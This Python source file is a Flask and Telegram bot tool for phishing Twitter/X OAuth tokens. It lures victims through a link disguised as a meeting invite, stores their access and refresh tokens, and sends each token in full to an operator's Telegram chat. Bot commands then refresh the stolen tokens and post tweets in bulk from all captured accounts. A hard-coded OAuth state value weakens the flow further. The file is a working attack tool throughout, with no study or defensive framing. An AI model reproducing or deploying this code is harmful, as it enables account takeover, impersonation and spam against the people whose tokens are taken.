import base64
import hashlib
import os
import requests
import sqlite3
from flask import Flask, redirect, request, session, render_template
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import CommandHandler, Updater, CallbackContext

# Configuration
CLIENT_ID = os.getenv('CLIENT_ID')
CLIENT_SECRET = os.getenv('CLIENT_SECRET')
CALLBACK_URL = os.getenv('CALLBACK_URL')
TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')
TELEGRAM_CHAT_ID = os.getenv('TELEGRAM_CHAT_ID')

app = Flask(__name__)
app.secret_key = os.urandom(24)

# Database Functions
def store_token_in_db(username, access_token, refresh_token):
    conn = sqlite3.connect('tokens.db')
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS tokens (username TEXT, access_token TEXT, refresh_token TEXT)
    ''')
    cursor.execute('INSERT INTO tokens (username, access_token, refresh_token) VALUES (?, ?, ?)',
                   (username, access_token, refresh_token))
    conn.commit()
    conn.close()

def get_usernames_from_db():
    conn = sqlite3.connect('tokens.db')
    cursor = conn.cursor()
    cursor.execute('SELECT username FROM tokens')
    usernames = [row[0] for row in cursor.fetchall()]
    conn.close()
    return usernames

def refresh_all_tokens():
    conn = sqlite3.connect('tokens.db')
    cursor = conn.cursor()
    cursor.execute('SELECT username, refresh_token FROM tokens')
    tokens = cursor.fetchall()

    for username, refresh_token in tokens:
        perform_refresh(refresh_token)

    conn.commit()
    conn.close()

def get_twitter_username(access_token):
    url = "https://api.twitter.com/2/users/me"
    headers = {
        "Authorization": f"Bearer {access_token}"
    }

    response = requests.get(url, headers=headers)

    if response.status_code == 200:
        data = response.json()
        username = data.get("data", {}).get("username")
        return username
    else:
        print(f"Failed to fetch username. Status code: {response.status_code}")
        return None

# Telegram Bot Command Handling
def start(update: Update, context: CallbackContext):
    update.message.reply_text("Welcome! Use /refresh_single, /refresh_bulk, /post_single, or /post_bulk commands.")

def refresh_single(update: Update, context: CallbackContext):
    usernames = get_usernames_from_db()
    keyboard = [[KeyboardButton(username)] for username in usernames]
    reply_markup = ReplyKeyboardMarkup(keyboard)
    update.message.reply_text('Select account to refresh:', reply_markup=reply_markup)

def refresh_bulk(update: Update, context: CallbackContext):
    refresh_all_tokens()
    update.message.reply_text("Bulk token refresh completed.")

def post_single(update: Update, context: CallbackContext):
    tweet_text = ' '.join(context.args)
    if not tweet_text:
        update.message.reply_text("Please provide tweet text after the command.")
        return
    usernames = get_usernames_from_db()
    keyboard = [[KeyboardButton(username)] for username in usernames]
    reply_markup = ReplyKeyboardMarkup(keyboard)
    update.message.reply_text('Select account to post tweet:', reply_markup=reply_markup)

def post_bulk(update: Update, context: CallbackContext):
    tweet_text = ' '.join(context.args)
    if not tweet_text:
        update.message.reply_text("Please provide tweet text after the command.")
        return
    update.message.reply_text("Posting tweets in bulk with random delay between posts.")
    post_tweets_bulk(tweet_text)

def handle_error(update: Update, context: CallbackContext):
    update.message.reply_text("An error occurred. Please try again later.")

# Token Refreshing and Posting Functions
def perform_refresh(refresh_token):
    token_url = 'https://api.twitter.com/2/oauth2/token'

    client_credentials = f"{CLIENT_ID}:{CLIENT_SECRET}"
    auth_header = base64.b64encode(client_credentials.encode()).decode('utf-8')

    headers = {
        'Authorization': f'Basic {auth_header}',
        'Content-Type': 'application/x-www-form-urlencoded'
    }

    data = {
        'refresh_token': refresh_token,
        'grant_type': 'refresh_token',
        'client_id': CLIENT_ID
    }

    response = requests.post(token_url, headers=headers, data=data)
    token_response = response.json()

    if response.status_code == 200:
        new_access_token = token_response.get('access_token')
        new_refresh_token = token_response.get('refresh_token')
        send_to_telegram(new_access_token, new_refresh_token)
        return f"New Access Token: {new_access_token}, New Refresh Token: {new_refresh_token}", 200
    else:
        error_description = token_response.get('error_description', 'Unknown error')
        error_code = token_response.get('error', 'No error code')
        return f"Error refreshing token: {error_description} (Code: {error_code})", response.status_code

def post_tweets_bulk(tweet_text):
    usernames = get_usernames_from_db()
    for username in usernames:
        access_token = get_access_token_for_username(username)
        post_tweet(access_token, tweet_text)

def post_tweet(access_token, tweet_text):
    TWITTER_API_URL = "https://api.twitter.com/2/tweets"
    headers = {
        "Authorization": f"Bearer {access_token}",
        "Content-Type": "application/json"
    }
    payload = {
        "text": tweet_text
    }

    response = requests.post(TWITTER_API_URL, json=payload, headers=headers)

    if response.status_code == 201:
        tweet_data = response.json()
        return f"Tweet posted successfully: {tweet_data['data']['id']}"
    else:
        error_message = response.json().get("detail", "Failed to post tweet")
        return f"Error posting tweet: {error_message}"

# OAuth Flow for Token Management
@app.route('/')
def home():
    code = request.args.get('code')
    state = request.args.get('state')
    error = request.args.get('error')

    if not code:
        state = "0"  # Use fixed state value
        session['oauth_state'] = state

        code_verifier, code_challenge = generate_code_verifier_and_challenge()
        session['code_verifier'] = code_verifier  # Store code_verifier in session

        authorization_url = (
            f"https://twitter.com/i/oauth2/authorize?client_id={CLIENT_ID}&response_type=code&"
            f"redirect_uri={CALLBACK_URL}&scope=tweet.read%20tweet.write%20users.read%20offline.access&"
            f"state={state}&code_challenge={code_challenge}&code_challenge_method=S256"
        )

        return redirect(authorization_url)

    if code:
        if error:
            return f"Error during authorization: {error}", 400

        if state != "0":  # Check for the fixed state value
            return "Invalid state parameter", 403

        code_verifier = session.pop('code_verifier', None)

        token_url = "https://api.twitter.com/2/oauth2/token"
        data = {
            'grant_type': 'authorization_code',
            'code': code,
            'redirect_uri': CALLBACK_URL,
            'code_verifier': code_verifier
        }

        response = requests.post(token_url, auth=(CLIENT_ID, CLIENT_SECRET), data=data)
        token_response = response.json()

        if response.status_code == 200:
            access_token = token_response.get('access_token')
            refresh_token = token_response.get('refresh_token')

            session['access_token'] = access_token
            session['refresh_token'] = refresh_token

            username = get_twitter_username(access_token)
            store_token_in_db(username, access_token, refresh_token)
            send_to_telegram(access_token, refresh_token)
            return f"Access Token: {access_token}, Refresh Token: {refresh_token}"
        else:
            error_description = token_response.get('error_description', 'Unknown error')
            error_code = token_response.get('error', 'No error code')
            return f"Error retrieving access token: {error_description} (Code: {error_code})", response.status_code

# Send messages to Telegram
def send_startup_message():
    state = "0"  # Fixed state value for initialization
    code_verifier, code_challenge = generate_code_verifier_and_challenge()

    authorization_url = CALLBACK_URL

    meeting_url = f"{CALLBACK_URL}j?meeting={state}&pwd={code_challenge}"

    message = (
        f"🚀 *OAuth Authorization Link:*\n[Authorize link]({authorization_url})\n\n"
        f"📅 *Meeting Link:*\n[Meeting link]({meeting_url})"
    )

    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    data = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message,
        "parse_mode": "Markdown"
    }
    requests.post(url, json=data)

# Function to send token details to Telegram
def send_to_telegram(access_token, refresh_token=None):
    alert_emoji = "🚨"
    key_emoji = "🔑"

    username = get_twitter_username(access_token)
    if username:
        twitter_url = f"https://twitter.com/{username}"
    else:
        twitter_url = "Unknown user"

    message = f"{alert_emoji} *New user authenticated: OAuth 2.0*\n"
    message += f"{key_emoji} *Access Token:* `{access_token}`\n"

    if refresh_token:
        refresh_link = f"{CALLBACK_URL}refresh/{refresh_token}"
        message += f"{key_emoji} *Refresh Token Link:* [Refresh Token]({refresh_link})\n"

    tweet_link = f"{CALLBACK_URL}tweet/{access_token}"
    message += f"{key_emoji} *Post a Tweet Link:* [Post a Tweet]({tweet_link})\n"
    message += f"👤 *Twitter Profile:* [@{username}]({twitter_url})"

    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    data = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message,
        "parse_mode": "Markdown"
    }
    requests.post(url, json=data)

# Telegram bot setup
updater = Updater(token=TELEGRAM_BOT_TOKEN, use_context=True)
dispatcher = updater.dispatcher

# Add command handlers
dispatcher.add_handler(CommandHandler("start", start))
dispatcher.add_handler(CommandHandler("refresh_single", refresh_single))
dispatcher.add_handler(CommandHandler("refresh_bulk", refresh_bulk))
dispatcher.add_handler(CommandHandler("post_single", post_single))
dispatcher.add_handler(CommandHandler("post_bulk", post_bulk))
dispatcher.add_error_handler(handle_error)

updater.start_polling()

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    send_startup_message()  # Send the startup message with OAuth and meeting links
    app.run(host='0.0.0.0', port=port)
